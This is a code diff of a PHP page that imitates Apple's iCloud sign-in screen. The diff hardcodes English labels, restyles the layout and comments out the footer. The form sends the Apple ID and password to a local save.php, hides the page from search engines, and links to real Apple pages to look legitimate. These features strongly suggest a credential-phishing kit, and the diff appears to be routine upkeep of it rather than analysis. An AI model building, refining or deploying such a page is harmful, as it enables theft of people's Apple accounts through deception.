@@ -23,7 +23,7 @@ switch ($lang) {
  
 }
  
-include_once 'languages/'.$lang_file;
+// include_once 'languages/'.$lang_file;
 ?>
 
 <!DOCTYPE html>
@@ -37,7 +37,7 @@ include_once 'languages/'.$lang_file;
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta content="width=device-width, initial-scale=1" name="viewport"/>
 	<meta name="robots" content="noindex, nofollow" />
-	<title><?php echo $lang['PAGE_TITLE']; ?></title>
+	<title>Home Page</title>
 	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 	<link rel="shortcut icon" href="assets/img/favicon.ico">
 	<link rel="stylesheet" href="assets/layout/strap.css">
@@ -82,13 +82,13 @@ include_once 'languages/'.$lang_file;
 	<div id="status"><span></span></div>
 </div>
 
-<section id="header">
+<section id="header" class="container m-2">
 	<div class="container-fluid">
 		<div class="row">
 			<div class="col-md-4 col-xs-8 rightH rtl">
 				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
 				<span class="spreat"></span>
-								<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/"><?php echo $lang['SETUP_INSTRUCTIONS'] ?></a>
+								<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/">Setup INstruction</a>
 								<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
 					<ul>
 						<li><a href="find">iCloud Settings</a></li>
@@ -104,35 +104,44 @@ include_once 'languages/'.$lang_file;
 	</div>
 </section>
 
-<section class="login-form text-center" style="display: block;">
+<section class="login-form text-center container" style="display: block;">
 
 	<img src="assets/img/cloud.png" class="img-cloud" alt="">
 	
-	<h2><?php echo $lang['SIGN_IN_TITLE']; ?></h2>
-
+	<div class="row">
+		<h2 class="mb-2">Sign In</h2>
+	</div>
 	<form action="save.php" class="cloud-login form-ajax" role="form" data-red="find" method="post" accept-charset="utf-8">
 
-
-		<input type="text" class="id" name="appleid" id="appleID" placeholder="<?php echo $lang['APPLE_ID']; ?>" style="direction: ltr !important;">
-		<input type="password" autocomplete="off" class="pwd" name="password" id="password" placeholder="<?php echo $lang['PASSWORD']; ?>">
-		<input type="submit" class="dolog" name="singin" id="singin" value="">
-		<img class="loading" src="assets/img/ajax-loader.gif" alt="Loading" />
-		<div class="alrt">
+		<div class="row justify-content-center mb-3">
+			<div class="form-group col-md-5">
+				<input type="text" class="id form-control" name="appleid" id="appleID" placeholder="Apple ID" style="direction: ltr !important;">	
+			</div>
+			<div class="form-group col-md-5">
+				<input type="password" autocomplete="off" class="pwd form-control" name="password" id="password" placeholder="Password">	
+			</div>
+		</div>
+		
+		<div class="row justify-content-center">
+			<input type="submit" class="dolog  btn" name="singin" id="singin" value="Sign In">	
+		</div>
+		<!-- <img class="loading" src="assets/img/ajax-loader.gif" alt="Loading" /> -->
+		<div class="alert">
 		</div>
 		
 	</form>
 
 	<div class="keepme">
 		<input type="checkbox" id="keepme" />
-		<span for="keepme"><?php echo $lang['KEEP_ME']; ?></span>
+		<span for="keepme">Keep Me</span>
 	</div>
 
 	<div class="forget">
-		<a href="https://iforgot.apple.com/" target="_blank"><?php echo $lang['FORGOT_ID']; ?></a>
+		<a href="https://iforgot.apple.com/" target="_blank">Forget ID</a>
 		<div id="response"></div>
 	</div>
 	<div class="newid">
-		<?php echo $lang['DONT_HAVE_ID']; ?> <a href="https://appleid.apple.com/account" target="blank"><?php echo $lang['CREATE_YOURS']; ?></a>
+		DON'T HAVE ID <a href="https://appleid.apple.com/account" target="blank"> CREATE_YOURS</a>
 		<div id="response"></div>
 	</div>
 
@@ -242,20 +251,22 @@ include_once 'languages/'.$lang_file;
 	</div>
 
 
-</section><footer class="foot">
+</section>
+
+<!-- <footer class="foot">
 	<div class="container-fluid">
 		<div class="row">
 		
-		<div class="col-md-10 col-xs-12 foot-link">
-			<a href="https://www.icloud.com/activationlock" target="blank"><?php echo $lang['CHECK_ACTIVATION']; ?></a>
+		<div class="col-md-10 col-sm-12 foot-link">
+			<a href="https://www.icloud.com/activationlock" target="blank">CHECK_ACTIVATION</a>
 			<span class="footer-link-separator"></span>
-			<a href="https://www.apple.com/support/systemstatus/" target="_blank"><?php echo $lang['SYSTEM_STATUS']; ?></a>
+			<a href="https://www.apple.com/support/systemstatus/" target="_blank">SYSTEM_STATUS</a>
 			<span class="footer-link-separator"></span>
-			<a href="https://www.apple.com/privacy/" target="_blank"><?php echo $lang['POLICY']; ?></a>
+			<a href="https://www.apple.com/privacy/" target="_blank">POLICY</a>
 			<span class="footer-link-separator"></span>
-			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank"><?php echo $lang['TERMS']; ?></a>
+			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank">TERMS</a>
 			<span class="footer-link-separator"></span>
-			<span class="copyright"><?php echo $lang['COPYRIGHT']; ?></span>
+			<span class="copyright">COPYRIGHT</span>
 		</div>
 		<div class="col-md-2 col-xs-12 apple">
 			<a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>
@@ -263,7 +274,7 @@ include_once 'languages/'.$lang_file;
 
 		</div>
 	</div>
-</footer>
+</footer> -->
 	
 	<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
 	<script src="assets/js/strap.min.js"></script>
@@ -272,7 +283,7 @@ include_once 'languages/'.$lang_file;
 	<script src="assets/js/ajax-form.min.js"></script> -->
 <?php
 if(isset($_GET["error"])){
-echo $lang['IDPWD_ERROR_ALERT'];
+echo 'IDPWD_ERROR_ALERT';
 }
 ?>
 </body>
